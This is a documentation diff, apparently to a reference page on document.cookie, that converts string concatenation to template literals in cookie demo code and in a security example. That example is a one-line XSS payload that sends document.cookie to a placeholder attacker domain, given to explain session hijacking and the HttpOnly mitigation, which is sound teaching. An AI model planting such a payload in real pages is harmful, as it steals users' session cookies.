@@ -138,7 +138,7 @@ document.cookie = "favorite_food=tripe; SameSite=None; Secure";
 
 function showCookies() {
   const output = document.getElementById('cookies')
-  output.textContent = '> ' + document.cookie
+  output.textContent = `> ${document.cookie}`
 }
 
 function clearOutputCookies() {
@@ -178,7 +178,7 @@ const cookieValue = document.cookie
 
 function showCookieValue() {
   const output = document.getElementById('cookie-value')
-  output.textContent = '> ' + cookieValue
+  output.textContent = `> ${cookieValue}`
 }
 
 function clearOutputCookieValue() {
@@ -358,7 +358,7 @@ session. Stealing a cookie from a web application leads to hijacking the
 authenticated user's session. Common ways to steal cookies include using [social engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) or by exploiting a [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) vulnerability in the application -
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+(new Image()).src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
 ```
 
 The `HTTPOnly` cookie attribute can help to mitigate this attack by
